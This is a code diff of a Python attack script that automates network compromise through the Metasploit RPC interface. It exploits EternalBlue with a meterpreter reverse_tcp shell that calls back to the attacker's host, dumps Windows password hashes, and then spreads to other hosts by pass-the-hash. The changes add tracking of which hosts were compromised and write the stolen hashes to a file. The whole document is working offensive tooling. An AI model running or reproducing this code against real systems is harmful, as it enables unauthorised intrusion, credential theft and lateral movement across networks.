@@ -104,14 +104,13 @@ def passTheHash(ip, localip, hashlist, client):
         exploit['SMBPass'] = data[2]
         times = 1
         while times <= 10:
-           print('Trying ' + data[0] + ' on ' + ip + '...')
-           hashes = runExploit(client, exploit, payload, 6)
-           if hashes != None:
-               print('Successfeully accessed ' + ip + ' in ' + str(times) + ' attempts')
-               return hashes
+           print('Attempt ' + str(times) + ' passing ' + data[0] + ' on ' + ip + '...')
+           hashData = runExploit(client, exploit, payload, 6)
+           if hashData != None:
+               print('Successfeully accessed ' + hashData[0] + ' in ' + str(times) + ' attempts')
+               return hashData
            else:
                times += 1
-
     return None
     
 def eternalBlue(ip, localip, client):
@@ -122,10 +121,10 @@ def eternalBlue(ip, localip, client):
     # Load the reverse_tcp shell payload
     payload = client.modules.use('payload', 'windows/x64/meterpreter/reverse_tcp')
     payload['LHOST'] = localip
-    hashes = runExploit(client, exploit, payload, 18)
-    if hashes != None:
-        print('Gained ' + str(len(hashes)) + ' hashes from ' + str(ip))
-        return hashes 
+    hashData = runExploit(client, exploit, payload, 30)
+    if hashData != None:
+        print('Gained ' + str(len(hashData[1])) + ' hashes from ' + hashData[0])
+        return hashData 
     return None
 
 def maxId(keys):
@@ -152,12 +151,21 @@ def runExploit(client, exploit, payload, timeout):
     shell.runsingle('run post/windows/gather/hashdump')
     while(True):
         output = shell.read()
-        if len(output) > 0:
-            print(output)
         if(':::' in output):
             hashes = gatherHashes(output)
-            return hashes
+            return (exploit['RHOST'], hashes)
     return None
+
+def writeOutput(data):
+    file = open('pthout.txt', 'w') 
+    
+    for hashpair in data:
+        file.write(hashpair[0] + "\n")
+        for hash in hashpair[1]:
+            file.write("\t" + str(hash[0]) + ' - ' + str(hash[2] + "\n"))
+    
+    file.close() 
+
 
 def getArgs(argv):
     if len(argv) < 4:
@@ -187,24 +195,29 @@ def main():
     client = setupRPC()
     # Try to break into machines with eternal blue
     hashes = []
+    successes = []
 
     while len(hashes) == 0:
         for i in reversed(range(len(targets))):
             hashData = eternalBlue(targets[i].get('ip'), args['localIp'], client)
             if hashData != None:
                 del targets[i]
-                mergeList(hashes, hashData)
+                mergeList(hashes, hashData[1])
+                successes.append(hashData)
                 break
 
     if len(hashes) > 0:
         # Found access to network start spidering
         print('Starting hash passing...')
         for i in range(len(targets)):
-            newHashes = passTheHash(targets[i].get('ip'), args['localIp'], hashes, client)
-            if newHashes != None:
-                print('Adding ' + str(len(newHashes)) + ' to the hash list')
-                mergeList(hashes, newHashes)
-                print(hashes)
+            hashData = passTheHash(targets[i].get('ip'), args['localIp'], hashes, client)
+            if hashData != None:
+                print('Adding ' + str(len(hashData[1])) + ' to the hash list')
+                mergeList(hashes, hashData[1])
+                successes.append(hashData)
+        print('Writing hashes to pthout.txt...')
+        writeOutput(successes)
+        print('Bye!')
     else:
         print('Could not gain access to network... bye!')
 
